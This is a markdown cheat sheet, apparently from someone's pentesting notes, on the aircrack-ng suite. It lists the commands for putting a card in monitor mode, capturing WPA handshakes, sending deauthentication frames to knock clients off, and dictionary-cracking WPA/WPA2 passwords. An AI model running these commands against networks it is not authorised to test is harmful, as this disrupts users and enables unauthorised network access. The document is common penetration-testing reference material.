# Cybersecurity Utility - airmon-ng

Part of the Aircrack suite, Airmon-ng is a complete suite of tools used to access WiFi Networkk Security.

- It focuses on the following areas of WiFi Security
    + Monitoring: Packet capture and export of data to text files for further processing by third party tools
    + Attacking: Replay attacks, deauthentication, fake access points and others via packet injection
    + Testing: Checking WiFi cards and driver capabilities (capture and injection)
    + Cracking: WEP and WPA PSK (WPA 1 and 2)

## Table of Contents
- [Information](#information)
- [Setup](#setup)
- [Documentation](#documentation)
- [Resources](#resources)
- [References](#references)
- [Remarks](#remarks)
- [Notes](#notes)

## Information

+ Utility Type: Network Packet Capture, Network WiFi cracking
+ Tool Area of Efficiency : Defensive (Blue Team)
+ Penetration Testing stage : Scanning & Enumeration
+ Package Name: aircrack-ng
+ Repository URL: https://github.com/aircrack-ng/aircrack-ng

## Setup

### Pre-Requisites
+ git
+ make
- Available WiFi network interface for a target (i.e. wlan0)
	- using *ip*
        ```console
        ip a s
        ```
    
    - using ifconfig
        ```console
        ifconfig
        ```

	- using iwconfig
        ```console
        iwconfig
        ```

### Dependencies
+ build-essential 
+ libssl-dev 
+ libnl-3-dev 
+ pkg-config 
+ libnl-genl-3-dev

### Obtaining

- Download package 'aircrack-ng' (Not Latest)
    - Package Manager is apt|apt-get|aptitude (Debian-based)
        ```console
        sudo apt(-get) install aircrack-ng
        ```
    - Package Manager is Pacman (Arch-based)
        ```console
        sudo pacman -S aircrack-ng
        ```

- From Git Repository
	- Clone Repository
		```
		git clone https://github.com/aircrack-ng/aircrack-ng
		```
	- Change Directory into source code
		```
		cd aircrack-ng
		```
	- Reconfigure
		```console
		autoreconf -i
		```
	- Configure
		```console
		./configure --with-experimental
		```
	- Build binary
		```console
		make
		```
	- Install program
		```console
		make install
		```
	- Load Config
		```console
		ldconfig
		```

## Documentation

### Synopsis/Syntax

- WiFi Interface Monitoring
    ```console
    airmon-ng {options} [actions]
    ```

- WiFi Monitoring Dump
    ```console
    airodump-ng {options} [interface]
    ```

- Deauthenticating Client
    ```console
    aireplay-ng {options} [interface]
    ```

- Hack Wifi Password
    ```console
    aircrack-ng {option} [authentication-handshake-file]
    ```

### Parameters

#### airmon-ng
+ check : Check for all processes that uses the wireless interface
+ kill  : Kill all processes that use the wireless interface
+ start [interface] : Start the wireless interface in monitor mode

#### airodump-ng
+ --bssid [MAC address]	: Specify the MAC address of the Access Point
+ -c [channel_number]	: Specify the channel for the Wireless Network
+ -w [file name prefix] : Specify the file name prefix for the file that will contain the authentication handshake; i.e. WPAcrack
+ --ignore-negative-one : Fixes the "fixed channel : -1" error message

#### aireplay-ng
+ --deauth [frames]	: Specify the number of de-authentication frames you want to send; 0 for unlimited
+ -a [MAC address]	: Specify the MAC address of the Access Point
+ -c [MAC address]	: Specify the MAC address of the client
+ --ignore-negative-one : Fixes the fixed channel : -1" error message

#### aircrack-ng
+ -b [MAC address]	: Specify the MAC address of the Access Point
+ -w [wordlist-file]	: Specify the name of the dictionary file used to crack the WPA/WPA2-PSK password (brute-force/dictionary attack)

### Usage

- Find an stop all processes that uses the wireless interface and may cause trouble
	```console
	sudo airmon-ng check kill
	```

- Start the Wireless Interface in Monitor Mode
	+ Create a new wireless interface called *mon0* in Monitor Mode
	```console
	sudo airmon-ng start wlan0
	```

- To see all the wireless traffic that passes by in the air
	```console
	sudo airodump-ng mon0
	```

- Collect the Authentication Handshake for the access point we are interested in
	+ Wait until the command captures a handshake
	- If you see the "WPA handshake: 00:11:22:33:44:55" in the top right-hand corner of the screen
		+ The command has successfully captured the handshake
	```console
	sudo airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w WPAcrack mon0 --ignore-negative-one
	```

- (OPTIONAL) Deauthenticate the client
	- Send deauth to broadcast
		```console
		sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 mon0 --ignore-negative-one
		```
	- Send directed deauth (attack is more effective when targeted)
		```console
		sudo aireplay-ng --deauth 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF mon0 --ignore-negative-one
		```

- Crack WiFi (WPA/WPA2-PSK) password via Brute-force/Dictionary attack
	```console
	aircrack-ng -w wordlist.dic -b 00:11:22:33:44:55 WPAcrack.cap
	```

### Sequence
> This sequence will change according to your interface as it is just a Proof-of-Concept
1. Put our Wireless Network Interface into Monitor Mode
    - using *airmon-ng*
        ```console
        airmon-ng start wlan0
        ```
2. Get Access Point's MAC Address that you are targeting 
    - using *airodump-ng*
        ```console
        airodump-ng wlan0mon
        ```
3. Capture Packets between Access Point and Client (Represented by STATION) and Save them in the *pentestdump* file
    - using *airodump-ng*
        + bssid : MAC Address of Attacking Machine
        ```console
        airodump-ng -c 11 --bssid [Access Point MAC address] -w [write-output-file] [wireless-network-interface]
        ```
4. Force four-way handshake
    - using *aireplay-ng* for faster result
        ```console
        aireplay-ng -0 1 -a [attacking machine MAC address] -c [target machine MAC address] [wireless-network-interface]
        ```
5. Crack WiFi password and write to file 'password.lst'
    - using *aircrack-ng*
        ```console
        aircrack-ng -w [wordlist-file] -b [Access Point MAC address] [input-packet-filename]
        ```

## Resources

## References
+ [Hakin9 - Crack WPA/WPA2 Wi-Fi Routers with Aircrack-ng and Hashcat](https://hakin9.org/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat/)

## Remarks

## Notes
